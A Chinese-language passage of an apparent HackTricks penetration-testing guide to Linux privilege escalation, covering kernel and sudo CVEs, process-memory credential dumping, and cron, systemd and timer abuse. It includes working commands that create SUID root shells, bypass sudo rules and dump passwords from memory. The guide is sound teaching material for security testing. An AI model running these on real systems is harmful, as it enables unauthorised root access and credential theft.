# Linux 权限提升

{{#include ../../../banners/hacktricks-training.md}}

如需了解更广泛的背景和历史枚举流程，请参阅参考资料中列出的 g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation 和 linux-private-i 资源。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## 系统信息

### OS 信息

先来了解一下正在运行的 OS。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### 路径

如果你**对 `PATH` 变量中的任何文件夹有写入权限**，就可能劫持某些库或二进制文件：

```bash
echo $PATH
```

### 环境信息

环境变量中是否有有用的信息、密码或 API 密钥？

```bash
(env || set) 2>/dev/null
```

### 内核漏洞利用

检查内核版本，确认是否存在可用于提升权限的漏洞利用

[内核/LPE/CVE 章节](../../main-system-information/kernel-lpe-cves/README.md) 汇总了本地提权案例，并链接到 Binary Exploitation 中更深入的 Linux 内核文章。测试案例前，请确认受影响的构建版本和配置。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

你可以在这里找到一个不错的易受攻击内核列表和一些已**编译的 exploits**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
其他可以找到一些**已编译的 exploits**的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有存在漏洞的内核版本，可以这样做：

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

可用于搜索 kernel exploits 的工具包括：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害机器上执行，只检查 kernel 2.x 的 exploits）

务必**在 Google 中搜索 kernel 版本**。你的 kernel 版本可能会出现在某个 kernel exploit 中，这样你就能确定该 exploit 是否有效。

其他 kernel exploitation 技术：

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux 提权 - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo 版本

根据以下内容中列出的存在漏洞的 sudo 版本：

```bash
searchsploit sudo
```

你可以使用此 grep 检查 sudo 版本是否存在漏洞。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

上游 sudo **1.9.14 至 1.9.17** 允许无特权的本地用户通过 `--chroot` 选项提权至 root，条件是 sudo 从用户可控的目录加载 `/etc/nsswitch.conf`；上游已在 **1.9.17p1** 中修复此问题。请检查相关路径下所有 root-setuid 的 sudo 可执行文件，因为 `sudo -V` 只会报告 `PATH` 中选中的二进制文件。发行版软件包可能会回移植修复，但不更改上游版本字符串，因此也请核实供应商软件包的状态。请参阅 [sudo 维护者的安全公告](https://www.openwall.com/lists/oss-security/2025/06/30/3)。<sup>[[28]](#references)[[29]](#references)</sup>

这里有一个用于利用该[漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)的 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)。运行 exploit 前，请确认你的 `sudo` 版本存在漏洞，且支持 `chroot` 功能。

更多信息请参阅原始[漏洞公告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)。<sup>[[28]](#references)</sup>

### Sudo 基于主机的规则绕过 (CVE-2025-32462)

上游 sudo **1.8.8 至 1.9.17** 在评估基于主机的 sudoers 规则时，可能会使用 `sudo -h <host>` 中**用户提供的主机名**，而非**真实主机名**；上游已在 **1.9.17p1** 中修复此问题。用户仍须在所选主机上有匹配的 sudoers 条目。请检查供应商回移植情况和其他 sudo 二进制文件，以及本地策略。请参阅 [sudo 维护者的安全公告](https://www.openwall.com/lists/oss-security/2025/06/30/2)。<sup>[[29]](#references)</sup>

要求：
- 存在漏洞的 sudo 版本
- 特定于主机的 sudoers 规则（主机既不是当前主机名，也不是 `ALL`）

sudoers 模式示例：

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

通过伪造获准主机进行 Exploit：

```bash
sudo -h devbox id
sudo -h devbox -i
```

如果所选名称无法解析，请确认该名称在主机上的解析结果。仅在日志或配置文件中看到某个名称，并不意味着它可以解析；而修改 `/etc/hosts` 通常需要特权写入权限。

#### sudo < v1.8.28

此 [上游 Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) 需要存在一条有效的 sudo 规则，允许以 `ALL` 用户身份执行命令，同时排除 root，例如 `(ALL, !root) /bin/bash`。调用者还必须获准使用该规则，包括满足任何身份验证要求。请检查已安装软件包的安全公告：供应商可能已将修复向后移植到显示的上游版本仍低于 1.8.28 的版本中。仅有 `!root` 规则或旧版本，均不能确认存在漏洞。被动枚举期间不要测试特权命令。

```
sudo -u#-1 /bin/bash
```

### Dmesg 签名验证失败

查看 **HTB 的 smasher2 靶机**，了解此漏洞可能如何被利用的**示例**。

```bash
dmesg 2>/dev/null | grep "signature"
```

### 更多系统枚举

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 枚举可能的防御措施

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## 容器逃逸

如果你在容器内，先查看以下容器安全章节，然后再转向针对特定运行时的滥用页面：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## 驱动器

检查**哪些内容已挂载或未挂载**、挂载位置和原因。如果有未挂载的内容，可以尝试挂载并检查其中是否包含私人信息。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 有用的软件

列举有用的二进制文件

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

同时，检查是否安装了**任何编译器**。如果需要使用某些 kernel exploit，这会很有用，因为建议在你将要使用它的机器（或类似机器）上编译它。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许存在某个旧版本的 Nagios（例如），可以利用它来提权……\
建议手动检查较可疑的已安装软件的版本。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

如果你可以通过 SSH 访问这台机器，也可以使用 **openVAS** 检查机器内安装的软件是否过时或存在漏洞。

> [!NOTE] > _请注意，这些命令会显示大量信息，其中大部分都没有用。因此，建议使用 OpenVAS 或类似应用程序检查已安装软件的版本是否容易受到已知 exploit 的攻击_

## Processes

查看正在执行的**进程**，并检查是否有进程拥有**超出其所需的权限**（例如，是否有 tomcat 进程由 root 运行？）

```bash
ps aux
ps -ef
top -n 1
```

始终检查是否有 [**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](../../software-information/electron-cef-chromium-debugger-abuse.md)。**Linpeas** 会检查进程命令行中的 `--inspect` 参数来检测这些调试器。\
也要**检查你对进程二进制文件的权限**，或许你可以覆盖它们。

### 跨用户父子进程链

子进程以**不同于父进程的用户**身份运行，并不一定是恶意行为，但这是一个有用的**初步排查信号**。某些用户身份切换是预期行为（`root` 启动服务用户进程、登录管理器创建会话进程），但异常的进程链可能暴露包装程序、调试辅助程序、持久化机制或薄弱的运行时信任边界。

快速检查：

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

如果发现可疑的调用链，请检查父进程命令行，以及所有会影响其行为的文件（`config`、`EnvironmentFile`、辅助脚本、工作目录、可写参数）。在一些真实的 privesc 路径中，子进程本身不可写，但**由父进程控制的配置**或辅助脚本链可写。

### 已删除的可执行文件和已删除但仍打开的文件

运行时产物在**删除后**通常仍然可以访问。这既有助于权限提升，也有助于从仍打开敏感文件的进程中恢复证据。

检查已删除的可执行文件：

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

如果 `/proc/<PID>/exe` 指向 `(deleted)`，则该进程仍在内存中运行旧的二进制映像。这是值得调查的重要信号，因为：

- 已删除的可执行文件可能包含有用的字符串或凭据
- 正在运行的进程可能仍暴露有用的文件描述符
- 已删除的特权二进制文件可能表明近期发生过篡改或尝试清理

全局收集已删除但仍处于打开状态的文件：

```bash
lsof +L1
```

如果发现有趣的描述符，直接将其取回：

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

当进程仍打开已删除的 secret、脚本、数据库导出文件或 flag 文件时，这尤其有价值。

### 进程监控

你可以使用 [**pspy**](https://github.com/DominicBreuker/pspy) 等工具监控进程。这对于识别频繁运行的易受攻击进程，或在满足一组条件时执行的进程，非常有用。

#### sudo 下的 Linux ProcMon

[Linux 版 ProcMon](https://github.com/microsoft/ProcMon-for-Linux) 可以跟踪选定的进程和系统调用，并保存 SQLite 跟踪记录。如果 `sudo -l` 允许不受限制地以 root 权限运行 `procmon` 命令，可以考虑它是否能够观察其他用户进程的输入或输出。此权限只是一个审查线索：跟踪器支持情况、实际生效的策略以及合适进程是否正在活动，都很重要。跟踪文件可能包含 secrets，因此请仔细检查获准导出的内容，并避免收集无关进程的信息。

### 进程内存

服务器上的某些服务会在内存中以**明文保存凭据**。\
通常，你需要**root 权限**才能读取属于其他用户的进程内存，因此在你已经是 root 并希望发现更多凭据时，这通常更有用。\
不过，请记住，**作为普通用户，你可以读取自己拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器**默认不允许 ptrace**，这意味着你无法转储属于你的非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：只要 UID 相同，所有进程都可以被调试。这是 ptrace 传统上的工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE capability。
> - **kernel.yama.ptrace_scope = 3**：任何进程都不能通过 ptrace 跟踪。设置后，必须重启才能再次启用 ptrace。

短暂解锁密码库的同 UID 进程可能构成独立的凭据边界。在允许跟踪时，处于活动状态且可转储的进程可能通过其输入系统调用或内存暴露密码库密码，即使加密的密码库文件本身仍受到保护。`ptrace_scope=0` 只是其中一个前提条件；凭据匹配、目标进程是否可转储、其他 Linux 安全模块以及进程的存活时间也很重要。密码库中的条目能否用于 Unix root 登录，还需要单独检查凭据是否可复用。常规枚举应报告策略以及候选进程或密码库路径，而不是捕获输入或打印 secrets。请参阅 [内核的 Yama 文档](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) 和 [ptrace 访问检查](https://man7.org/linux/man-pages/man2/ptrace.2.html)。

#### GDB

如果你可以访问某个 FTP 服务的内存（例如），就可以获取 Heap 并在其中搜索凭据。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB 脚本

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示内存如何映射到该进程的**虚拟地址空间中；它还会显示**每个映射区域的权限**。**mem** 伪文件**暴露进程自身的内存**。通过 **maps** 文件，我们可以知道哪些**内存区域可读**以及它们的偏移量。利用这些信息，我们可以**定位到 mem 文件中的相应位置，并将所有可读区域转储**到一个文件中。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` 提供对系统**物理**内存的访问，而非虚拟内存。可以使用 /dev/kmem 访问内核的虚拟地址空间。\
通常，只有 **root** 和 **kmem** 组成员才能读取 `/dev/mem`。

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux 版 ProcDump

ProcDump 是将 Windows Sysinternals 工具套件中的经典 ProcDump 工具重新构想并移植到 Linux 的版本。可从 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### 工具

要转储进程内存，可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 权限要求，并转储由你拥有的进程
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root）

### 从进程内存中获取凭据

#### 手动示例

如果你发现 authenticator 进程正在运行：

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

你可以 dump 该进程（参见前面的章节，了解 dump 进程内存的不同方法），并在内存中搜索凭据：

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会从内存和一些**常见文件**中**窃取明文凭据**。要正常运行，需要 root 权限。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM 密码（Kali Desktop、Debian Desktop）          | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop）| gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（活动 FTP 连接）                           | vsftpd               |
| Apache2（活动 HTTP Basic Auth 会话）              | apache2              |
| OpenSSH（活动 SSH 会话 - Sudo 使用）              | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## 定时/Cron 任务

### Crontab UI (alseambusher) 以 root 身份运行 – 基于 Web 的调度器提权

如果 Web“Crontab UI”面板 (alseambusher/crontab-ui) 以 root 身份运行，且仅绑定到 loopback，你仍可通过 SSH 本地端口转发访问它，并创建特权任务来提权。<sup>[[1]](#references)[[4]](#references)</sup>

典型流程
- 发现仅限 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm，可使用 `ss -ntlp` / `curl -v localhost:8000`
- 在运维文件中查找凭据：
  - 使用 `zip -P <password>` 的备份/脚本
  - 暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` 的 systemd unit
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建高权限任务并立即运行（生成 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```

加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并限制其权限
- 绑定到 localhost，并通过防火墙/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅 root 可读的 EnvironmentFile
- 为按需执行的 job 启用审计/日志记录

检查是否有计划任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln？修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

如果使用 `run-parts`，请检查哪些名称实际上会执行：

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

这可以避免误报。可写的周期性目录只有在你的 payload 文件名符合本地 `run-parts` 规则时才有用。

### Cron 路径

例如，在 _/etc/crontab_ 中可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意，用户“user”对 /home/user_ 拥有写入权限）

如果 root 用户在此 crontab 中尝试执行某个命令或脚本，但未设置路径。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获取 root shell：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron 使用带通配符的脚本 (Wildcard Injection)

如果由 root 执行的脚本在命令中包含“**\***”，你就可以利用这一点执行意料之外的操作（例如 privesc）。示例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**如果 wildcard 前面带有路径，例如** _**/some/path/\***_ **，则不存在漏洞（即使是** _**./\***_ **也不行）。**

阅读以下页面，了解更多 wildcard 利用技巧：


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron 日志解析器中的 Bash 算术扩展注入

Bash 算术可以将不可信文本解析为表达式。在受影响的 Bash 环境中，该表达式中的数组下标可能会执行命令替换。如果具有特权的 cron/解析器将攻击者可控的日志文本放入此类算术比较中，命令替换就可能以解析器的身份运行。<sup>[[22]](#references)</sup> 这取决于具体的 Bash 表达式和版本；展开变量中的裸 `$(...)0` 字符串本身并不能可靠地证明会发生重新求值。

输入也可能来自文件元数据，或从用户可写位置读取的其他字段。例如，具有特权的清理脚本读取图像的 `Producer` 标签，并使用 `[[ "$producer" -eq "expected" ]]` 将其进行比较时，会执行算术比较，即使变量带有引号也不例外。追踪计划任务的运行身份、哪些文件可以提供该标签、比较前进行的任何转换，以及 Bash 的具体行为。对于文本标签，应使用字符串比较；对于数字，应在进行算术运算前验证输入仅包含十进制数字。请参阅 [Bash 算术规则](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)。

- 常见的易受攻击模式：
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- 针对数组下标机制的安全本地行为探测（不涉及特权进程或文件更改）：
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

追踪实际执行的定时脚本，以及它打开的字面输入路径。即使日志文件本身不可写，只要用户可以写入并遍历其非 sticky 父目录，就可能替换该目录项；`namei -l` 有助于区分这些权限。其他可写的日志路径、不可读的调度器，或从未将该字段作为 Bash 算术表达式求值的解析器，都不能证明这条路径成立。

### Cron 脚本覆盖与符号链接

如果你**可以修改由 root 执行的 cron 脚本**，就能很容易地获取一个 shell：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

如果 root 执行的脚本使用了一个你拥有完全访问权限的目录，也许可以删除该目录，并创建一个指向其他目录的符号链接目录，以此提供由你控制的脚本。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### 符号链接验证与更安全的文件处理

审查通过路径读取或写入文件的特权脚本/二进制文件时，请确认它们如何处理链接：

- `stat()` 会跟随符号链接并返回目标的元数据。
- `lstat()` 会返回链接本身的元数据。
- `readlink -f` 和 `namei -l` 可帮助解析最终目标，并显示路径各组件的权限。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

对于防御者/开发者，以下更安全的模式可防范 symlink tricks：

- `O_EXCL` 与 `O_CREAT` 一起使用：如果路径已存在则失败（阻止攻击者预先创建链接/文件）。
- `openat()`：相对于受信任的目录文件描述符进行操作。
- `mkstemp()`：以原子方式创建具有安全权限的临时文件。

### 可写载荷的自定义签名 cron 二进制文件
如果普通用户可以写入 root cron job 实际运行的二进制文件，就可能跨越权限边界，但自定义签名检查可以拒绝未签名的替换文件。在记录的案例中，该 ELF 文件归 root 所有，权限模式为 `0760`，允许其所属组的成员写入，同时允许 root 所有者执行。可见的进程跟踪显示，job 运行该二进制文件之前，`objcopy` 提取了 `.text_sig`；完整的验证脚本不可读。<sup>[[2]](#references)</sup>

成功的替换文件使用泄露的私有签名材料，通过 ELF signer 进行签名。其[格式文档](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)介绍了一个从可执行文件的 `.text` 派生出的签名 section。仅仅向 `.text_sig` 添加证书或匹配的字符串，并不能证明足以通过不可见的验证程序。下结论认为可写的签名二进制文件可被利用之前，应检查实际的计划任务路径、有效写入权限、root 调用方式以及验证策略。单独存在 `.text_sig` section 只能作为审查线索。

### 定期运行的 cron jobs

你可以监控进程，查找每 1、2 或 5 分钟执行一次的进程。也许你可以利用这一点来提升权限。

例如，要**在 1 分钟内每隔 0.1 秒监控一次**、**按执行次数从少到多排序**，并删除执行次数最多的命令，可以这样做：

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监控并列出每个启动的进程）。

### 保留攻击者设置的 mode bits 的 Root 备份（pg_basebackup）

如果由 root 所有的 cron 使用 `pg_basebackup`（或任何递归复制命令）处理一个你可写入的数据库目录，你就可以放置一个 **SUID/SGID binary**，它会以 **root:root** 身份、保留相同的 mode bits，被重新复制到备份输出中。<sup>[[26]](#references)</sup>

典型的发现流程（以低权限 DB 用户身份）：
- 使用 `pspy` 发现 root cron 每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认源集群（例如 `/var/lib/postgresql/14/main`）可由你写入，并且作业运行后目标目录（`/opt/backups/current`）归 root 所有。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

这是因为 `pg_basebackup` 在复制集群时会保留文件模式位；以 root 身份运行时，目标文件会继承 **root 所有权 + 攻击者指定的 SUID/SGID**。任何类似的特权备份/复制程序，只要会保留权限并将文件写入可执行位置，就存在漏洞。

### 隐形 cron 任务

可以通过在注释后添加一个回车符（不带换行符）来创建 cronjob，该 cron 任务仍会正常运行。示例（注意回车符）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

要检测这类隐蔽入口，请使用能够显示控制字符的工具检查 cron 文件：

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## 服务

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件。如果可以，你**可以修改它**，让它在服务**启动**、**重启**或**停止**时**执行**你的**后门**（你可能需要等待机器重启）。\
例如，在 .service 文件中创建后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对服务执行的二进制文件拥有**写入权限**，就可以将它们替换为后门，这样服务再次执行时就会运行后门。

### systemd PATH - 相对路径

你可以通过以下命令查看 **systemd** 使用的 PATH：

```bash
systemctl show-environment
```

如果你发现自己可以**写入**路径中的任何文件夹，就可能能够**提升权限**。你需要查找服务配置文件中使用的相对路径，例如：

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

然后，在你有写入权限的 systemd PATH 文件夹中，创建一个与相对路径二进制文件**同名**的**可执行文件**。当服务被要求执行易受攻击的操作（**Start**、**Stop**、**Reload**）时，你的 **backdoor 将会执行**（非特权用户通常无法启动/停止服务，但请检查你是否可以使用 `sudo -l`）。

**使用 `man systemd.service` 了解有关服务的更多信息。**

## **Timers**

**Timers** 是名称以 `**.timer**` 结尾的 systemd unit 文件，用于控制 `**.service**` 文件或事件。**Timers** 可以作为 cron 的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。

你可以通过以下命令枚举所有 timers：

```bash
systemctl list-timers --all
```

### 可写定时器

如果你可以修改一个定时器，就可以让它执行某些 systemd.unit 实例（例如 `.service` 或 `.target`）

```bash
Unit=backdoor.service
```

在文档中，你可以看到对 Unit 的说明：

> 计时器到期时要激活的单元。参数是一个单元名称，其后缀不是“.timer”。如果未指定此参数，则默认值为与计时器单元同名、但不带后缀的 service。（见上文。）建议被激活的单元名称与计时器单元名称相同，只有后缀不同。

因此，要滥用此权限，你需要：

- 找到某个 systemd 单元（例如 `.service`），它**正在执行一个可写二进制文件**
- 找到某个 systemd 单元，它**正在执行相对路径**，并且你对 **systemd PATH** 具有**可写权限**（以冒充该可执行文件）

**使用 `man systemd.timer` 了解有关计时器的更多信息。**

### **启用计时器**

要启用计时器，你需要 root 权限并执行：

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

注意，**timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建符号链接来**激活**的。

## 套接字

Unix Domain Sockets (UDS) 可在客户端-服务器模型中，让同一台或不同机器上的**进程进行通信**。它们使用标准 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行配置。<sup>[[14]](#references)</sup>

可以使用 `.socket` 文件配置套接字。

**使用 `man systemd.socket` 了解更多套接字相关信息。** 在此文件中，可以配置多个有用的参数：

